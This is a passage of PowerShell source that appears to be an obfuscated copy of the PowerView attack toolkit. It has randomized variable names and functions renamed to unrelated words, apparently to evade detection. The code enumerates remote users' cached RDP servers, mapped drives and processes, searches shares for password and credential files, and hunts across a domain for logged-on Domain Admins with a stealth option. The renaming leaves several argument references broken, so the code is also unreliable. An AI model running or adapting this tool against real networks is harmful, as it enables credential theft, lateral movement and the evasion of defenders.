                                $baPgXeJe99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
                                $baPgXeJe99 | Add-Member Noteproperty 'UserSID' $XnuUVOWC99
                                $baPgXeJe99 | Add-Member Noteproperty 'TargetServer' $ZAvweIpx99
                                $baPgXeJe99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $baPgXeJe99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $baPgXeJe99
                            }
                        }
                        $QiSQYhsu99 = $Reg.EnumKey($HKU,"$XnuUVOWC99\Software\Microsoft\Terminal Server Client\Servers").sNames
                        ForEach ($mSxqoOjK99 in $QiSQYhsu99) {
                            $fyzcAVFZ99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Software\Microsoft\Terminal Server Client\Servers\$mSxqoOjK99", 'UsernameHint').sValue
                            $baPgXeJe99 = New-Object PSObject
                            $baPgXeJe99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                            $baPgXeJe99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
                            $baPgXeJe99 | Add-Member Noteproperty 'UserSID' $XnuUVOWC99
                            $baPgXeJe99 | Add-Member Noteproperty 'TargetServer' $mSxqoOjK99
                            $baPgXeJe99 | Add-Member Noteproperty 'UsernameHint' $fyzcAVFZ99
                            $baPgXeJe99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $baPgXeJe99
                        }
                    }
                    catch {
                        Write-Verbose "[mosque] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[mosque] Error accessing $cXOPCAwl99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function doughtier {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $HKU = 2147483651
            $eWmMvJNh99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $cXOPCAwl99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $dvPUhiLr99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($XnuUVOWC99 in $dvPUhiLr99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $IsWOPBva99 = woodmen -ObjectSid $XnuUVOWC99 -Credential $gxazvivN99
                        }
                        else {
                            $IsWOPBva99 = woodmen -ObjectSid $XnuUVOWC99
                        }
                        $UkCqCRRe99 = ($Reg.EnumKey($HKU, "$XnuUVOWC99\Network")).sNames
                        ForEach ($eiDBhxZJ99 in $UkCqCRRe99) {
                            $sRjSCbXj99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Network\$eiDBhxZJ99", 'ProviderName').sValue
                            $jUpOxKII99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Network\$eiDBhxZJ99", 'RemotePath').sValue
                            $KThGlPjO99 = $Reg.GetStringValue($HKU, "$XnuUVOWC99\Network\$eiDBhxZJ99", 'UserName').sValue
                            if (-not $IsWOPBva99) { $IsWOPBva99 = '' }
                            if ($jUpOxKII99 -and ($jUpOxKII99 -ne '')) {
                                $ZPmfXjyw99 = New-Object PSObject
                                $ZPmfXjyw99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                                $ZPmfXjyw99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
                                $ZPmfXjyw99 | Add-Member Noteproperty 'UserSID' $XnuUVOWC99
                                $ZPmfXjyw99 | Add-Member Noteproperty 'DriveLetter' $eiDBhxZJ99
                                $ZPmfXjyw99 | Add-Member Noteproperty 'ProviderName' $sRjSCbXj99
                                $ZPmfXjyw99 | Add-Member Noteproperty 'RemotePath' $jUpOxKII99
                                $ZPmfXjyw99 | Add-Member Noteproperty 'DriveUserName' $KThGlPjO99
                                $ZPmfXjyw99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $ZPmfXjyw99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[doughtier] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[doughtier] Error accessing $cXOPCAwl99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function console {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            try {
                $eWmMvJNh99 = @{
                    'ComputerName' = $VrEmrUHq99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $eWmMvJNh99['Credential'] = $gxazvivN99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $oRjANeVM99 = New-Object PSObject
                    $oRjANeVM99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
                    $oRjANeVM99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $oRjANeVM99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $oRjANeVM99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $oRjANeVM99 | Add-Member Noteproperty 'User' $Owner.User
                    $oRjANeVM99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $oRjANeVM99
                }
            }
            catch {
                Write-Verbose "[console] Error enumerating remote processes on '$cXOPCAwl99', access likely denied: $_"
            }
        }
    }
}
function overlapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $CuygeMzO99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $uKMZoAej99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $QRdxeHwL99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $rZqUJwQL99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $DXnIJKyo99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $KMUtBgIc99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $gnQjzbyA99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $dnROoQma99,
        [Switch]
        $SbmYKKRw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $CuygeMzO99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $PPosolen99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $uKMZoAej99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $PPosolen99['Include'] = @('*.exe')
        }
        $PPosolen99['Force'] = -not $PSBoundParameters['ExcludeHidden']
        $nFPezvSf99 = @{}
        function saintlier {
            [CmdletBinding()]Param([String]$Path)
            try {
                $zxVENVbO99 = [IO.File]::OpenWrite($Path)
                $zxVENVbO99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($VfipJrPp99 in $Path) {
            if (($VfipJrPp99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $GVmMliRp99 = (New-Object System.Uri($VfipJrPp99)).Host
                if (-not $nFPezvSf99[$GVmMliRp99]) {
                    distinctively -ComputerName $GVmMliRp99 -Credential $gxazvivN99
                    $nFPezvSf99[$GVmMliRp99] = $True
                }
            }
            $PPosolen99['Path'] = $VfipJrPp99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $QNmOTPuW99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $QNmOTPuW99 = $False
                }
                if ($uKMZoAej99 -and ($_.LastAccessTime -lt $uKMZoAej99)) {
                    $QNmOTPuW99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $QRdxeHwL99)) {
                    $QNmOTPuW99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $rZqUJwQL99)) {
                    $QNmOTPuW99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (saintlier -Path $_.FullName))) {
                    $QNmOTPuW99 = $False
                }
                if ($QNmOTPuW99) {
                    $pkyHbWCb99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $oVtXcgLd99 = New-Object -TypeName PSObject -Property $pkyHbWCb99
                    $oVtXcgLd99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $oVtXcgLd99
                }
            }
        }
    }
    END {
        $nFPezvSf99.Keys | reeling
    }
}
function glorious {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $VrEmrUHq99,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $yosqyblr99,
        [Parameter(Position = 2)]
        [Hashtable]
        $lWgFMRFK99,
        [Int]
        [ValidateRange(1,  100)]
        $wCkPnMUb99 = 20,
        [Switch]
        $VFZGebhX99
    )
    BEGIN {
        $HoILwanz99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $HoILwanz99.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not $VFZGebhX99) {
            $pdFOWRTO99 = Get-Variable -Scope 2
            $yRgTwRAU99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
            ForEach ($Var in $pdFOWRTO99) {
                if ($yRgTwRAU99 -NotContains $Var.Name) {
                $HoILwanz99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($CRRJdwmM99 in (Get-ChildItem Function:)) {
                $HoILwanz99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $CRRJdwmM99.Name, $CRRJdwmM99.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $wCkPnMUb99, $HoILwanz99, $Host)
        $Pool.Open()
        $AlrHOHqQ99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $aTLJkgPI99 = $M.GetParameters()
            if (($aTLJkgPI99.Count -eq 2) -and $aTLJkgPI99[0].Name -eq 'input' -and $aTLJkgPI99[1].Name -eq 'output') {
                $AlrHOHqQ99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $VrEmrUHq99 = $VrEmrUHq99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[glorious] Total number of hosts: $($VrEmrUHq99.count)"
        if ($wCkPnMUb99 -ge $VrEmrUHq99.Length) {
            $wCkPnMUb99 = $VrEmrUHq99.Length
        }
        $pyUMZySw99 = [Int]($VrEmrUHq99.Length/$wCkPnMUb99)
        $MDCsFjjc99 = @()
        $Start = 0
        $End = $pyUMZySw99
        for($i = 1; $i -le $wCkPnMUb99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $wCkPnMUb99) {
                $End = $VrEmrUHq99.Length
            }
            $List.AddRange($VrEmrUHq99[$Start..($End-1)])
            $Start += $pyUMZySw99
            $End += $pyUMZySw99
            $MDCsFjjc99 += @(,@($List.ToArray()))
        }
        Write-Verbose "[glorious] Total number of threads/partitions: $wCkPnMUb99"
        ForEach ($vnwipGpo99 in $MDCsFjjc99) {
            $gaPOxaEg99 = [PowerShell]::Create()
            $gaPOxaEg99.runspacepool = $Pool
            $Null = $gaPOxaEg99.AddScript($yosqyblr99).AddParameter('ComputerName', $vnwipGpo99)
            if ($lWgFMRFK99) {
                ForEach ($Param in $lWgFMRFK99.GetEnumerator()) {
                    $Null = $gaPOxaEg99.AddParameter($Param.Name, $Param.Value)
                }
            }
            $ERfozkEO99 = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $gaPOxaEg99
                Output = $ERfozkEO99
                Result = $AlrHOHqQ99.Invoke($gaPOxaEg99, @($Null, [Management.Automation.PSDataCollection[Object]]$ERfozkEO99))
            }
        }
    }
    END {
        Write-Verbose "[glorious] Threads executing"
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        $RJiMZTFH99 = 100
        Write-Verbose "[glorious] Waiting $RJiMZTFH99 seconds for final cleanup..."
        for ($i=0; $i -lt $RJiMZTFH99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose "[glorious] all threads completed"
    }
}
function drinkers {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $VrEmrUHq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cdytPdAI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $glLCVedN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $WrwfvIMy99,
        [Alias('Unconstrained')]
        [Switch]
        $MyERHgGv99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $fGipudMB99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $JKXRZnBu99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GtxmnElz99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rqcypngr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ojqqfkye99,
        [ValidateNotNullOrEmpty()]
        [String]
        $VlBmNldu99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IXFyKHnF99,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ZgtvBxHU99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $tUgZHPlx99,
        [Alias('AllowDelegation')]
        [Switch]
        $KAJorLmv99,
        [Switch]
        $fXeDJWKC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $DCpfKYOf99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $ohvTlzbv99 = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $GBWfEvAA99,
        [Switch]
        $QDuWiWQb99,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $YbzyUYhM99 = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $wCkPnMUb99 = 20
    )
    BEGIN {
        $tgaaoeGR99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $tgaaoeGR99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
        $xUaDkcfD99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $xUaDkcfD99['Identity'] = $rqcypngr99 }
        if ($PSBoundParameters['Domain']) { $xUaDkcfD99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['UserDomain']) { $xUaDkcfD99['Domain'] = $ojqqfkye99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $xUaDkcfD99['LDAPFilter'] = $VlBmNldu99 }
        if ($PSBoundParameters['UserSearchBase']) { $xUaDkcfD99['SearchBase'] = $IXFyKHnF99 }
        if ($PSBoundParameters['UserAdminCount']) { $xUaDkcfD99['AdminCount'] = $tUgZHPlx99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $xUaDkcfD99['AllowDelegation'] = $KAJorLmv99 }
        if ($PSBoundParameters['Server']) { $xUaDkcfD99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $xUaDkcfD99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $xUaDkcfD99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xUaDkcfD99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $xUaDkcfD99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $xUaDkcfD99['Credential'] = $gxazvivN99 }
        $EqAZlVKw99 = @()
        if ($PSBoundParameters['ComputerName']) {
            $EqAZlVKw99 = @($VrEmrUHq99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[drinkers] Stealth enumeration using source: $YbzyUYhM99"
                $LNiELDDv99 = New-Object System.Collections.ArrayList
                if ($YbzyUYhM99 -match 'File|All') {
                    Write-Verbose '[drinkers] Querying for file servers'
                    $DYQQJQqu99 = @{}
                    if ($PSBoundParameters['Domain']) { $DYQQJQqu99['Domain'] = $SSNUOPgW99 }
                    if ($PSBoundParameters['ComputerDomain']) { $DYQQJQqu99['Domain'] = $cdytPdAI99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $DYQQJQqu99['SearchBase'] = $WrwfvIMy99 }
                    if ($PSBoundParameters['Server']) { $DYQQJQqu99['Server'] = $mSxqoOjK99 }
                    if ($PSBoundParameters['SearchScope']) { $DYQQJQqu99['SearchScope'] = $vaSWXjPs99 }
                    if ($PSBoundParameters['ResultPageSize']) { $DYQQJQqu99['ResultPageSize'] = $mhcqrrQn99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $DYQQJQqu99['ServerTimeLimit'] = $mvTbAWDU99 }
                    if ($PSBoundParameters['Tombstone']) { $DYQQJQqu99['Tombstone'] = $rPozaKft99 }
                    if ($PSBoundParameters['Credential']) { $DYQQJQqu99['Credential'] = $gxazvivN99 }
                    $PWOtnDPd99 = furloughing @FileServerSearcherArguments
                    if ($PWOtnDPd99 -isnot [System.Array]) { $PWOtnDPd99 = @($PWOtnDPd99) }
                    $LNiELDDv99.AddRange( $PWOtnDPd99 )
                }
                if ($YbzyUYhM99 -match 'DFS|All') {
                    Write-Verbose '[drinkers] Querying for DFS servers'
                }
                if ($YbzyUYhM99 -match 'DC|All') {
                    Write-Verbose '[drinkers] Querying for domain controllers'
                    $zIQySoxi99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $zIQySoxi99['Domain'] = $SSNUOPgW99 }
                    if ($PSBoundParameters['ComputerDomain']) { $zIQySoxi99['Domain'] = $cdytPdAI99 }
                    if ($PSBoundParameters['Server']) { $zIQySoxi99['Server'] = $mSxqoOjK99 }
                    if ($PSBoundParameters['Credential']) { $zIQySoxi99['Credential'] = $gxazvivN99 }
                    $oNVkoMte99 = deplorably @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($oNVkoMte99 -isnot [System.Array]) { $oNVkoMte99 = @($oNVkoMte99) }
                    $LNiELDDv99.AddRange( $oNVkoMte99 )
                }
                $EqAZlVKw99 = $LNiELDDv99.ToArray()
            }
            else {
                Write-Verbose '[drinkers] Querying for all computers in the domain'
                $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[drinkers] TargetComputers length: $($EqAZlVKw99.Length)"
        if ($EqAZlVKw99.Length -eq 0) {
            throw '[drinkers] No hosts found to enumerate'
        }
        if ($PSBoundParameters['Credential']) {
            $DAmvjFbJ99 = $gxazvivN99.GetNetworkCredential().UserName
        }
        else {
            $DAmvjFbJ99 = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters['ShowAll']) {
            $eKjwQtUM99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $eKjwQtUM99 = township @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $YREeWdxN99 = @{
                'Identity' = $ZgtvBxHU99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $YREeWdxN99['Domain'] = $ojqqfkye99 }
            if ($PSBoundParameters['UserSearchBase']) { $YREeWdxN99['SearchBase'] = $IXFyKHnF99 }
            if ($PSBoundParameters['Server']) { $YREeWdxN99['Server'] = $mSxqoOjK99 }
            if ($PSBoundParameters['SearchScope']) { $YREeWdxN99['SearchScope'] = $vaSWXjPs99 }
            if ($PSBoundParameters['ResultPageSize']) { $YREeWdxN99['ResultPageSize'] = $mhcqrrQn99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $YREeWdxN99['ServerTimeLimit'] = $mvTbAWDU99 }
            if ($PSBoundParameters['Tombstone']) { $YREeWdxN99['Tombstone'] = $rPozaKft99 }
            if ($PSBoundParameters['Credential']) { $YREeWdxN99['Credential'] = $gxazvivN99 }
            $eKjwQtUM99 = strippers @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[drinkers] TargetUsers length: $($eKjwQtUM99.Length)"
        if ((-not $GBWfEvAA99) -and ($eKjwQtUM99.Length -eq 0)) {
            throw '[drinkers] No users found to target'
        }
        $kEgRxIzp99 = {
            Param($VrEmrUHq99, $eKjwQtUM99, $DAmvjFbJ99, $QDuWiWQb99, $BmRRNCwx99)
            if ($BmRRNCwx99) {
                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
            }
            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
                if ($Up) {
                    $eWqIWOTT99 = lagging -ComputerName $BumNVGRu99
                    ForEach ($ExnuZhXQ99 in $eWqIWOTT99) {
                        $IsWOPBva99 = $ExnuZhXQ99.UserName
                        $CName = $ExnuZhXQ99.CName
                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }
                        if (($IsWOPBva99) -and ($IsWOPBva99.Trim() -ne '') -and ($IsWOPBva99 -notmatch $DAmvjFbJ99) -and ($IsWOPBva99 -notmatch '\$$')) {
                            if ( (-not $eKjwQtUM99) -or ($eKjwQtUM99 -contains $IsWOPBva99)) {
                                $DrOworvY99 = New-Object PSObject
                                $DrOworvY99 | Add-Member Noteproperty 'UserDomain' $Null
                                $DrOworvY99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
                                $DrOworvY99 | Add-Member Noteproperty 'ComputerName' $BumNVGRu99
                                $DrOworvY99 | Add-Member Noteproperty 'SessionFrom' $CName
                                try {
                                    $CEvCIfFk99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $DrOworvY99 | Add-Member NoteProperty 'SessionFromName' $CEvCIfFk99
                                }
                                catch {
                                    $DrOworvY99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }
                                if ($fXeDJWKC99) {
                                    $Admin = (Abelson -ComputerName $CName).IsAdmin
                                    $DrOworvY99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $DrOworvY99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $DrOworvY99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $DrOworvY99
                            }
                        }
                    }
                    if (-not $QDuWiWQb99) {
                        $FjaaNWoN99 = Darla -ComputerName $BumNVGRu99
                        ForEach ($User in $FjaaNWoN99) {
                            $IsWOPBva99 = $User.UserName
                            $ojqqfkye99 = $User.LogonDomain
                            if (($IsWOPBva99) -and ($IsWOPBva99.trim() -ne '')) {
                                if ( (-not $eKjwQtUM99) -or ($eKjwQtUM99 -contains $IsWOPBva99) -and ($IsWOPBva99 -notmatch '\$$')) {
                                    $wStfQnQJ99 = @(erupt -ComputerName $BumNVGRu99)[0].IPAddress
                                    $DrOworvY99 = New-Object PSObject
                                    $DrOworvY99 | Add-Member Noteproperty 'UserDomain' $ojqqfkye99
                                    $DrOworvY99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
                                    $DrOworvY99 | Add-Member Noteproperty 'ComputerName' $BumNVGRu99
                                    $DrOworvY99 | Add-Member Noteproperty 'IPAddress' $wStfQnQJ99
                                    $DrOworvY99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $DrOworvY99 | Add-Member Noteproperty 'SessionFromName' $Null
                                    if ($fXeDJWKC99) {
                                        $Admin = Abelson -ComputerName $BumNVGRu99
                                        $DrOworvY99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $DrOworvY99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $DrOworvY99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $DrOworvY99
                                }
                            }
                        }
                    }
                }
            }
            if ($BmRRNCwx99) {
                Nina
            }
        }
        $WUqPycDr99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $WUqPycDr99 = admonished -Credential $gxazvivN99
            }
            else {
                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
            }
        }
    }
